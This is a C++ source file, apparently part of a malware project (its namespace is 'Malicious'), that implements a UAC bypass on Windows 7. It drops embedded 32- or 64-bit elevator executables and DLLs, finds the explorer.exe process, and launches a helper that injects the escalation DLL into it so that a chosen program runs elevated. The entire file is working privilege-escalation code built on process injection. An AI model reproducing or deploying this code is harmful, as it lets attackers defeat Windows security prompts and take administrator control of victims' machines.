#include "Elevator.hpp"
#include "BinaryRessource.hpp"

#include <system/System.hpp>
#include <system/Uac.hpp>
#include <system/Process.hpp>
using namespace System;

#include <ElevatorDll32.hpp>
#include <ElevatorDll64.hpp>
#include <Elevator32.hpp>
#include <Elevator64.hpp>

namespace Malicious
{
	DWORD elevate(std::string programPath)
	{
		switch(getSystemVersion())
	    {
		    case OS_WIN32_WINDOWS_VISTA:
			    if(isUacActivated())
			    {
					LOG << "Privilege escalation is not supported on Windows Vista";
			    }
			    break;
		    case OS_WIN32_WINDOWS_SEVEN:
			    if(isUacActivated())
			    {
					LOG << "Trying privilege escalation";
					BinaryRessource * elevatorDll = 0;
					BinaryRessource * elevator = 0;
					if(is64BitWindows())
					{
						LOG << "Windows 64bit detected";
						elevatorDll = new BinaryRessource(ElevatorDll64, sizeof(ElevatorDll64), ELEVATOR_DLL_NAME, true);
						elevator = new BinaryRessource(Elevator64, sizeof(Elevator64), ELEVATOR_EXE_NAME, true);
					}
					else
					{
						LOG << "Windows 32bit detected";
						elevatorDll = new BinaryRessource(ElevatorDll32, sizeof(ElevatorDll32), ELEVATOR_DLL_NAME, true);
						elevator = new BinaryRessource(Elevator32, sizeof(Elevator32), ELEVATOR_EXE_NAME, true);
					}

					LOG << "What is explorer.exe PID ?";
					DWORD explorer_pid = System::Process::GetPidFromName(ELEVATOR_PROCESS_NAME);
					if(explorer_pid)
					{
						LOG << "Injecting escalaion DLL in explorer.exe : " + to_string(explorer_pid);
					}
					else
					{
						FATAL_ERROR("Process explorer.exe does not exist");
					}
    				
                    System::Process::This thisProcess;
					using std::string;

                    string currentPath = thisProcess.getProgramDir();
					
                    string elevatorArguments = string(ELEVATOR_PROCESS_NAME) + " " + to_string(explorer_pid) + " " + currentPath+"\\"+std::string(ELEVATOR_DLL_NAME) + " " + programPath;
					LOG << "Escalation command line : " + string(ELEVATOR_EXE_NAME) + " " + elevatorArguments;

					System::Process::Launcher elevatorProcess(ELEVATOR_EXE_NAME, elevatorArguments);
					LOG << "Waiting elevator to finish";
					DWORD exitCode = elevatorProcess.wait();					

					delete elevatorDll;
					delete elevator;

					return exitCode;
			    }
				break;
			default:
				LOG << "Operating system not supported";
        }
		return EXIT_FAILURE;
	}

} // Malicious
